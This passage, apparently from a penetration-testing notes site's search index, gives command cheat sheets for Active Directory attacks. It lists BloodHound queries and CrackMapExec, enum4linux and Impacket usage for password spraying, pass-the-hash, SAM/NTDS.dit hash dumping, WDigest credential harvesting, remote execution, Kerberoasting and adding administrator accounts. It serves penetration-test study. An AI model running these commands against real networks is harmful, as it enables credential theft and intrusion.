(c:Computer)-[:HasSession]-&gt;(n) \nRETURN p\n</code></pre>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/BloodHound-Queries/#find-computers-with-unconstrained-delegation","title":"Find Computers with Unconstrained Delegation","text":"<pre><code>MATCH (c:Computer {unconstraineddelegation:true}) RETURN c\n</code></pre>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/BloodHound-Queries/#find-computers-with-unsupported-os","title":"Find Computers with Unsupported OS","text":"<pre><code>MATCH (H) WHERE H.operatingsystem =~ '.*(2000'\n</code></pre>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/BloodHound-Queries/#find-users-logged-in-within-90-days","title":"Find Users Logged In Within 90 Days","text":"<pre><code>MATCH (u:User) \nWHERE u.lastlogon &gt; (datetime().epochseconds - (90 * 86400)) \nRETURN u\n</code></pre>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/BloodHound-Queries/#find-users-with-passwords-set-within-90-days","title":"Find Users with Passwords Set Within 90 Days","text":"<pre><code>MATCH (u:User) \nWHERE u.pwdlastset &gt; (datetime().epochseconds - (90 * 86400)) \nRETURN u\n</code></pre>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/BloodHound-Queries/#find-constrained-delegation","title":"Find Constrained Delegation","text":"<pre><code>MATCH p=(u:User)-[:AllowedToDelegate]-&gt;(c:Computer) RETURN p\n</code></pre>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/BloodHound-Queries/#find-mssql-computers","title":"Find MSSQL Computers","text":"<pre><code>MATCH (c:Computer) \nWHERE ANY (x IN c.serviceprincipalnames WHERE toUpper(x) CONTAINS 'MSSQL') \nRETURN c\n</code></pre>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/BloodHound-Queries/#view-all-gpos","title":"View All GPOs","text":"<pre><code>MATCH (n:GPO) RETURN n\n</code></pre>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/BloodHound-Queries/#view-all-admin-groups","title":"View All Admin Groups","text":"<pre><code>MATCH (n:Group) WHERE toUpper(n.name) CONTAINS 'ADMIN' RETURN n\n</code></pre>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/BloodHound-Queries/#find-as-rep-roastable-users","title":"Find AS-REP Roastable Users","text":"<pre><code>MATCH (u:User {dontreqpreauth: true}) RETURN u\n</code></pre>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/BloodHound-Queries/#show-high-value-target-groups","title":"Show High Value Target Groups","text":"<pre><code>MATCH p=(n:User)-[r:MemberOf*1..]-&gt;(m:Group {highvalue:true}) RETURN p\n</code></pre>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/BloodHound-Queries/#find-groups-with-both-users-and-computers","title":"Find Groups with Both Users and Computers","text":"<pre><code>MATCH (c:Computer)-[r:MemberOf*1..]-&gt;(groupsWithComps:Group) \nWITH groupsWithComps \nMATCH (u:User)-[r:MemberOf*1..]-&gt;(groupsWithComps) \nRETURN DISTINCT(groupsWithComps) AS groupsWithCompsAndUsers\n</code></pre>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/BloodHound-Queries/#find-kerberoastable-users-in-high-value-groups","title":"Find Kerberoastable Users in High Value Groups","text":"<pre><code>MATCH (u:User)-[r:MemberOf*1..]-&gt;(g:Group) \nWHERE g.highvalue=true AND u.hasspn=true \nRETURN u\n</code></pre>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/BloodHound-Queries/#find-kerberoastable-users-and-adminto","title":"Find Kerberoastable Users and AdminTo","text":"<pre><code>MATCH (u:User {hasspn:true}) \nOPTIONAL MATCH (u)-[r:AdminTo]-&gt;(c:Computer) \nRETURN u\n</code></pre>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/BloodHound-Queries/#find-constrained-delegation-permissions","title":"Find Constrained Delegation Permissions","text":"<pre><code>MATCH (c:Computer) WHERE c.allowedtodelegate IS NOT NULL RETURN c\n</code></pre>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/BloodHound-Queries/#find-domain-user-permissions-on-gpo","title":"Find Domain User Permissions on GPO","text":"<pre><code>MATCH p=(u:User)-[r:AllExtendedRights]-&gt;(g:GPO) RETURN p\n</code></pre>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/BloodHound-Queries/#find-unprivileged-user-group-add-rights","title":"Find Unprivileged User Group Add Rights","text":"<pre><code>MATCH (n:User {admincount:False}) \nMATCH p=allShortestPaths((n)-[r:AddMember*1..]-&gt;(m:Group)) \nRETURN p\n</code></pre>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/BloodHound-Queries/#find-vpn-group-members","title":"Find VPN Group Members","text":"<pre><code>MATCH p=(u:User)-[:MemberOf]-&gt;(g:Group) \nWHERE toUpper(g.name) CONTAINS 'VPN' \nRETURN p\n</code></pre>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/BloodHound-Queries/#find-active-users-that-never-logged-on","title":"Find Active Users That Never Logged On","text":"<pre><code>MATCH (n:User) \nWHERE n.lastlogontimestamp=-1.0 AND n.enabled=TRUE \nRETURN n\n</code></pre>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/BloodHound-Queries/#find-cross-domain-permissions","title":"Find Cross-Domain Permissions","text":"<pre><code>MATCH p=(n)-[r]-&gt;(m) WHERE NOT n.domain = m.domain RETURN p\n</code></pre>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/BloodHound-Queries/#find-user-sessions-in-a-specific-domain","title":"Find User Sessions in a Specific Domain","text":"<pre><code>MATCH p=(m:Computer)-[r:HasSession]-&gt;(n:User {domain:'specificDomainValue'}) RETURN p\n</code></pre>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/CrackMapExec/","title":"CrackMapExec (CME)","text":""},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/CrackMapExec/#crackmapexec-cme","title":"CrackMapExec (CME)","text":"<p>CrackMapExec (CME) is an open-source post-exploitation tool that helps penetration testers perform various network-level attacks and enumeration tasks, It is particularly useful for managing large Active Directory (AD) environments.  </p>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/CrackMapExec/#key-functionalities","title":"Key Functionalities","text":"<ol> <li> <p>Enumerating Users and Groups    Lists users, groups, and other AD objects  </p> </li> <li> <p>Password Spraying    Tests a single password against multiple user accounts  </p> </li> <li> <p>Command Execution    Executes commands remotely on target systems  </p> </li> <li> <p>Dumping Hashes    Extracts password hashes from remote systems  </p> </li> <li> <p>Accessing Shares    Lists and accesses SMB shares on remote systems  </p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/CrackMapExec/#target-formats","title":"Target Formats","text":"<ol> <li> <p>Single IP address: <pre><code>crackmapexec smb [IP-ADDRESS-1] [IP-ADDRESS-2]\n</code></pre></p> </li> <li> <p>IP range: <pre><code>crackmapexec smb [IP-ADDRESS]-28 [IP-ADDRESS]-67\n</code></pre></p> </li> <li> <p>CIDR notation: <pre><code>crackmapexec smb [IP-ADDRESS]/24\n</code></pre></p> </li> <li> <p>Targets from file: <pre><code>crackmapexec smb targets.txt\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/CrackMapExec/#connect-to-target-using-local-account","title":"Connect to Target Using Local Account","text":"<ol> <li> <p>Connect with a local account: <pre><code>crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --local-auth\n</code></pre></p> </li> <li> <p>Using a null session: <pre><code>crackmapexec smb [IP-ADDRESS] -u \"\" -p \"\"\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/CrackMapExec/#pass-the-hash-against-a-subnet","title":"Pass the Hash Against a Subnet","text":"<ol> <li> <p>Pass the hash with local auth: <pre><code>crackmapexec smb [IP-ADDRESS]/24 -u [USERNAME] -H '[LMHASH:NTHASH]' --local-auth\n</code></pre></p> </li> <li> <p>Standard pass the hash: <pre><code>crackmapexec smb [IP-ADDRESS]/24 -u [USERNAME] -H '[NTHASH]'\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/CrackMapExec/#bruteforcing-and-password-spraying","title":"Bruteforcing and Password Spraying","text":"<ol> <li> <p>Single password: <pre><code>crackmapexec smb [IP-ADDRESS]/24 -u \"[USERNAME]\" -p \"[PASSWORD]\"\n</code></pre></p> </li> <li> <p>Multiple passwords: <pre><code>crackmapexec smb [IP-ADDRESS]/24 -u \"[USERNAME]\" -p \"[PASSWORD1]\" \"[PASSWORD2]\"\n</code></pre></p> </li> <li> <p>Multiple users: <pre><code>crackmapexec smb [IP-ADDRESS]/24 -u \"[USERNAME1]\" \"[USERNAME2]\" -p \"[PASSWORD]\"\n</code></pre></p> </li> <li> <p>Users and passwords from files: <pre><code>crackmapexec smb [IP-ADDRESS]/24 -u [USER_FILE] -p [PASS_FILE]\n</code></pre></p> </li> <li> <p>Users from file, hashes from file: <pre><code>crackmapexec smb [IP-ADDRESS]/24 -u [USER_FILE] -H [NTLM_HASH_FILE]\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/CrackMapExec/#user-enumeration","title":"User Enumeration","text":"<ol> <li> <p>Enumerate users: <pre><code>crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --users\n</code></pre></p> </li> <li> <p>Perform RID brute force to get users: <pre><code>crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --rid-brute\n</code></pre></p> </li> <li> <p>Enumerate domain groups: <pre><code>crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --groups\n</code></pre></p> </li> <li> <p>Enumerate local users: <pre><code>crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --local-users\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/CrackMapExec/#host-enumeration","title":"Host Enumeration","text":"<ol> <li> <p>Generate a list of relayable hosts: <pre><code>crackmapexec smb [IP-ADDRESS]/24 --gen-relay-list output.txt\n</code></pre></p> </li> <li> <p>Enumerate available shares: <pre><code>crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --local-auth --shares\n</code></pre></p> </li> <li> <p>Get active sessions: <pre><code>crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --sessions\n</code></pre></p> </li> <li> <p>Check logged-in users: <pre><code>crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --lusers\n</code></pre></p> </li> <li> <p>Get the password policy: <pre><code>crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --pass-pol\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/CrackMapExec/#command-execution-methods","title":"Command Execution Methods","text":"<ol> <li> <p>Execute a command through <code>cmd.exe</code>: <pre><code>crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' -x 'whoami'\n</code></pre></p> </li> <li> <p>Force the <code>smbexec</code> method: <pre><code>crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' -x 'net user Administrator /domain' --exec-method smbexec\n</code></pre></p> </li> <li> <p>Execute commands through PowerShell: <pre><code>crackmapexec smb [IP-ADDRESS] -u [USERNAME] -p '[PASSWORD]' -X 'whoami'\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/CrackMapExec/#getting-credentials","title":"Getting Credentials","text":"<ol> <li> <p>Dump local SAM hashes: <pre><code>crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --local-auth --sam\n</code></pre></p> </li> <li> <p>Enable WDigest to get credentials from LSA memory: <pre><code>crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --local-auth --wdigest enable\n</code></pre></p> </li> <li> <p>Disable WDigest: <pre><code>crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --local-auth --wdigest disable\n</code></pre></p> </li> <li> <p>Query user sessions: <pre><code>crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' -x 'quser'\n</code></pre></p> </li> <li> <p>Force logoff: <pre><code>crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' -x 'logoff [SESSIONID]'\n</code></pre></p> </li> <li> <p>Dump the <code>NTDS.dit</code> from the Domain Controller using <code>secretsdump.py</code>: <pre><code>crackmapexec smb [IP-ADDRESS] -u [USERNAME] -p '[PASSWORD]' --ntds\n</code></pre></p> </li> <li> <p>Use Volume Shadow Copy Service to dump <code>NTDS.dit</code>: <pre><code>crackmapexec smb [IP-ADDRESS] -u [USERNAME] -p '[PASSWORD]' --ntds vss\n</code></pre></p> </li> <li> <p>Dump the <code>NTDS.dit</code> password history: <pre><code>crackmapexec smb [IP-ADDRESS]/24 -u [USERNAME] -p '[PASSWORD]' --ntds-history\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/CrackMapExec/#additional-features","title":"Additional Features","text":"<ol> <li> <p>Upload a file to a remote share: <pre><code>crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --local-auth --upload local_file.txt \\\\remote\\share\n</code></pre></p> </li> <li> <p>Download a file from a remote share: <pre><code>crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --local-auth --download \\\\remote\\share\\remote_file.txt local_path\n</code></pre></p> </li> <li> <p>Add a new user: <pre><code>crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --local-auth -x \"net user [NEW_USER] [NEW_PASS] /add\"\n</code></pre></p> </li> <li> <p>Add a user to the Administrators group: <pre><code>crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --local-auth -x \"net localgroup administrators [NEW_USER] /add\"\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/Enum4linux/","title":"Enum4linux","text":""},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/Enum4linux/#enum4linux","title":"Enum4Linux","text":"<p>Enum4Linux is a Linux-based command-line tool used for gathering information from Windows machines and Samba servers. It is commonly used by penetration testers and security professionals to perform SMB (Server Message Block) enumeration.  </p>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/Enum4linux/#basic-usage","title":"Basic Usage","text":"<ol> <li> <p>Run basic enumeration against a target: <pre><code>enum4linux [IP-ADDRESS]\n</code></pre></p> </li> <li> <p>Run full basic enumeration (all options): <pre><code>enum4linux -a [IP-ADDRESS]\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/Enum4linux/#user-and-group-enumeration","title":"User and Group Enumeration","text":"<ol> <li> <p>Enumerate users: <pre><code>enum4linux -U [IP-ADDRESS]\n</code></pre></p> </li> <li> <p>Enumerate users with credentials: <pre><code>enum4linux -u [USERNAME] -p [PASSWORD] -U [IP-ADDRESS]\n</code></pre></p> </li> <li> <p>Enumerate groups: <pre><code>enum4linux -G [IP-ADDRESS]\n</code></pre></p> </li> <li> <p>Enumerate groups with credentials: <pre><code>enum4linux -u [USERNAME] -p [PASSWORD] -G [IP-ADDRESS]\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/Enum4linux/#rid-cycling","title":"RID Cycling","text":"<ol> <li> <p>Perform RID cycling to enumerate users: <pre><code>enum4linux -r [IP-ADDRESS]\n</code></pre></p> </li> <li> <p>Perform RID cycling with credentials: <pre><code>enum4linux -u [USERNAME] -p [PASSWORD] -r [IP-ADDRESS]\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/Enum4linux/#share-enumeration","title":"Share Enumeration","text":"<ol> <li> <p>List shares on the target: <pre><code>enum4linux -S [IP-ADDRESS]\n</code></pre></p> </li> <li> <p>List shares with credentials: <pre><code>enum4linux -u [USERNAME] -p [PASSWORD] -S [IP-ADDRESS]\n</code></pre></p> </li> <li> <p>List publicly accessible shares: <pre><code>enum4linux -s [IP-ADDRESS]\n</code></pre></p> </li> <li> <p>List publicly accessible shares with credentials: <pre><code>enum4linux -u [USERNAME] -p [PASSWORD] -s [IP-ADDRESS]\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/Enum4linux/#password-policy-enumeration","title":"Password Policy Enumeration","text":"<ol> <li> <p>Retrieve password policy: <pre><code>enum4linux -P [IP-ADDRESS]\n</code></pre></p> </li> <li> <p>Retrieve password policy with credentials: <pre><code>enum4linux -u [USERNAME] -p [PASSWORD] -P [IP-ADDRESS]\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/Enum4linux/#domain-and-workgroup-information","title":"Domain and Workgroup Information","text":"<ol> <li> <p>Get domain and workgroup information: <pre><code>enum4linux -n [IP-ADDRESS]\n</code></pre></p> </li> <li> <p>Get domain and workgroup information with credentials: <pre><code>enum4linux -u [USERNAME] -p [PASSWORD] -n [IP-ADDRESS]\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/Enum4linux/#os-information","title":"OS Information","text":"<ol> <li> <p>Get OS information: <pre><code>enum4linux -o [IP-ADDRESS]\n</code></pre></p> </li> <li> <p>Get OS information with credentials: <pre><code>enum4linux -u [USERNAME] -p [PASSWORD] -o [IP-ADDRESS]\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/Enum4linux/#detailed-report","title":"Detailed Report","text":"<ol> <li> <p>Perform all basic checks: <pre><code>enum4linux -a [IP-ADDRESS]\n</code></pre></p> </li> <li> <p>Perform all basic checks with credentials: <pre><code>enum4linux -u [USERNAME] -p [PASSWORD] -a [IP-ADDRESS]\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/Enum4linux/#miscellaneous","title":"Miscellaneous","text":"<ol> <li> <p>List hostnames: <pre><code>enum4linux -i [IP-ADDRESS]\n</code></pre></p> </li> <li> <p>List hostnames with credentials: <pre><code>enum4linux -u [USERNAME] -p [PASSWORD] -i [IP-ADDRESS]\n</code></pre></p> </li> <li> <p>Check for null sessions: <pre><code>enum4linux -N [IP-ADDRESS]\n</code></pre></p> </li> <li> <p>Check for null sessions with credentials: <pre><code>enum4linux -u [USERNAME] -p [PASSWORD] -N [IP-ADDRESS]\n</code></pre></p> </li> <li> <p>List all available options: <pre><code>enum4linux -A [IP-ADDRESS]\n</code></pre></p> </li> <li> <p>List all available options with credentials: <pre><code>enum4linux -u [USERNAME] -p [PASSWORD] -A [IP-ADDRESS]\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/Impacket-Toolkit/","title":"Impacket Toolkit","text":""},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/Impacket-Toolkit/#impacket-toolkit","title":"Impacket Toolkit","text":"<p>Impacket is a collection of Python classes for working with network protocols. It is highly regarded in the cybersecurity community for its ability to handle low-level network tasks and its extensive support for various protocols, making it an essential toolkit for penetration testers and security researchers.</p>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/Impacket-Toolkit/#smbsmb2","title":"SMB/SMB2","text":"<p>smbclient.py : Interactive SMB client to work with shares.</p> <ol> <li>Access SMB shares interactively <pre><code>smbclient.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS]\n</code></pre></li> <li>List all available shares on the target <pre><code>smbclient.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS] -L\n</code></pre></li> </ol> <p>secretsdump.py : Dump secrets from a remote machine without executing any agent.</p> <ol> <li> <p>Dump NTLM hashes of all domain users from a domain controller <pre><code>secretsdump.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS]\n</code></pre></p> </li> <li> <p>Dump NTLM hashes using Pass-the-Hash <pre><code>secretsdump.py -hashes [LMHASH]:[NTHASH] [DOMAIN]/[USERNAME]@[IP-ADDRESS]\n</code></pre></p> </li> </ol> <p>netview.py : Enumerate shares and sessions on the network.</p> <ol> <li> <p>Enumerate network shares and sessions <pre><code>netview.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS]\n</code></pre></p> </li> <li> <p>Enumerate shares using Pass-the-Hash <pre><code>netview.py -hashes [LMHASH]:[NTHASH] [DOMAIN]/[USERNAME]@[IP-ADDRESS]\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/Impacket-Toolkit/#msrpc","title":"MSRPC","text":"<p>rpcclient.py : Execute client-side MSRPC calls. </p> <ol> <li> <p>Execute MSRPC client calls <pre><code>rpcclient.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS]\n</code></pre></p> </li> <li> <p>Enumerate domain users <pre><code>rpcclient.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS] -c \"enumdomusers\"\n</code></pre></p> </li> <li> <p>Enumerate domain groups <pre><code>rpcclient.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS] -c \"enumdomgroups\"\n</code></pre></p> </li> <li> <p>Execute command on target machine <pre><code>rpcclient.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS] -c \"cmd\"\n</code></pre></p> </li> </ol> <p>rpcdump.py : Dump information about endpoints and interfaces.</p> <ol> <li> <p>Dump RPC endpoints and interfaces info <pre><code>rpcdump.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS]\n</code></pre></p> </li> <li> <p>Dump RPC endpoints using Pass-the-Hash <pre><code>rpcdump.py -hashes [LMHASH]:[NTHASH] [DOMAIN]/[USERNAME]@[IP-ADDRESS]\n</code></pre></p> </li> <li> <p>Dump RPC endpoints with no credentials <pre><code>rpcdump.py -no-pass [DOMAIN]/[USERNAME]@[IP-ADDRESS]\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/Impacket-Toolkit/#dcerpc","title":"DCE/RPC","text":"<p>atexec.py : Execute commands using Task Scheduler.</p> <ol> <li> <p>Execute command using Task Scheduler <pre><code>atexec.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS] [COMMAND]\n</code></pre></p> </li> <li> <p>Execute command using Pass-the-Hash <pre><code>atexec.py -hashes [LMHASH]:[NTHASH] [DOMAIN]/[USERNAME]@[IP-ADDRESS] [COMMAND]\n</code></pre></p> </li> <li> <p>Execute command with no credentials <pre><code>atexec.py -no-pass [DOMAIN]/[USERNAME]@[IP-ADDRESS] [COMMAND]\n</code></pre></p> </li> </ol> <p>wmiexec.py : Execute commands via WMI.</p> <ol> <li> <p>Execute command via WMI <pre><code>wmiexec.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS] [COMMAND]\n</code></pre></p> </li> <li> <p>Execute command using Pass-the-Hash <pre><code>wmiexec.py -hashes [LMHASH]:[NTHASH] [DOMAIN]/[USERNAME]@[IP-ADDRESS] [COMMAND]\n</code></pre></p> </li> <li> <p>Execute command with no credentials <pre><code>wmiexec.py -no-pass [DOMAIN]/[USERNAME]@[IP-ADDRESS] [COMMAND]\n</code></pre></p> </li> </ol> <p>dcomexec.py : Execute commands using DCOM. </p> <ol> <li> <p>Execute command using DCOM <pre><code>dcomexec.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS] [COMMAND]\n</code></pre></p> </li> <li> <p>Execute command using Pass-the-Hash <pre><code>dcomexec.py -hashes [LMHASH]:[NTHASH] [DOMAIN]/[USERNAME]@[IP-ADDRESS] [COMMAND]\n</code></pre></p> </li> <li> <p>Execute command with no credentials <pre><code>dcomexec.py -no-pass [DOMAIN]/[USERNAME]@[IP-ADDRESS] [COMMAND]\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/Impacket-Toolkit/#ldap","title":"LDAP","text":""},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/Impacket-Toolkit/#getaduserspy-enumerate-all-users-in-the-domain","title":"GetADUsers.py : Enumerate all users in the domain.","text":"<ol> <li> <p>Enumerate all domain users <pre><code>GetADUsers.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS]\n</code></pre></p> </li> <li> <p>Enumerate all users including disabled accounts <pre><code>GetADUsers.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS] -all\n</code></pre></p> </li> <li> <p>Use Pass-the-Hash for enumeration <pre><code>GetADUsers.py -hashes [LMHASH]:[NTHASH] [DOMAIN]/[USERNAME]@[IP-ADDRESS]\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/Impacket-Toolkit/#getuserspnspy-enumerate-service-principal-names-spns","title":"GetUserSPNs.py : Enumerate Service Principal Names (SPNs).","text":"<ol> <li> <p>Enumerate user SPNs <pre><code>GetUserSPNs.py [DOMAIN]/[USERNAME]:[PASSWORD] -dc-ip [IP-ADDRESS]\n</code></pre></p> </li> <li> <p>Request TGS for identified SPNs <pre><code>GetUserSPNs.py [DOMAIN]/[USERNAME]:[PASSWORD] -request -dc-ip [IP-ADDRESS]\n</code></pre></p> </li> <li> <p>Use Pass-the-Hash to enumerate SPNs <pre><code>GetUserSPNs.py -hashes [LMHASH]:[NTHASH] [DOMAIN]/[USERNAME] -dc-ip [IP-ADDRESS]\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/Impacket-Toolkit/#windapsearchpy-perform-ldap-queries-against-active-directory","title":"windapsearch.py : Perform LDAP queries against Active Directory.","text":"<ol> <li> <p>Enumerate Group Policy Objects <pre><code>python3 windapsearch.py --dc-ip [IP-ADDRESS] -u [USERNAME]@[DOMAIN] -p [PASSWORD] --gpos\n</code></pre></p> </li> <li> <p>Enumerate objects with administrative privileges <pre><code>python3 windapsearch.py --dc-ip [IP-ADDRESS] -u [USERNAME]@[DOMAIN] -p [PASSWORD] --admin-objects\n</code></pre></p> </li> <li> <p>Enumerate users with SPNs <pre><code>python3 windapsearch.py --dc-ip [IP-ADDRESS] -u [USERNAME]@[DOMAIN] -p [PASSWORD] --user-spns\n</code></pre></p> </li> <li> <p>Enumerate users with unconstrained delegation <pre><code>python3 windapsearch.py --dc-ip [IP-ADDRESS] -u [USERNAME]@[DOMAIN] -p [PASSWORD] --unconstrained-users\n</code></pre></p> </li> <li> <p>Enumerate computers with unconstrained delegation <pre><code>python3 windapsearch.py --dc-ip [IP-ADDRESS] -u [USERNAME]@[DOMAIN] -p [PASSWORD] --unconstrained-computers\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/Impacket-Toolkit/#kerberos","title":"Kerberos","text":""},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/Impacket-Toolkit/#ticketerpy-generate-kerberos-tickets","title":"ticketer.py : Generate Kerberos tickets.","text":"<ol> <li> <p>Generate a TGT ticket for a user <pre><code>ticketer.py -nthash [NTHASH] -domain-sid [SID] [USERNAME]\n</code></pre></p> </li> <li> <p>Generate a service ticket for a user and SPN <pre><code>ticketer.py -nthash [NTHASH] -domain-sid [SID] -request [USERNAME] [SPN]\n</code></pre></p> </li> <li> <p>Generate TGT ticket with AES encryption <pre><code>ticketer.py -aesKey [AESKEY] -domain-sid [SID] [USERNAME]\n</code></pre></p> </li> </ol> <p>GetNPUsers.py : Check for accounts with pre-authentication disabled.</p> <ol> <li> <p>Enumerate accounts with pre-auth disabled <pre><code>GetNPUsers.py [DOMAIN]/[USERNAME]:[PASSWORD] -dc-ip [IP-ADDRESS]\n</code></pre></p> </li> <li> <p>Request TGT for identified accounts <pre><code>GetNPUsers.py 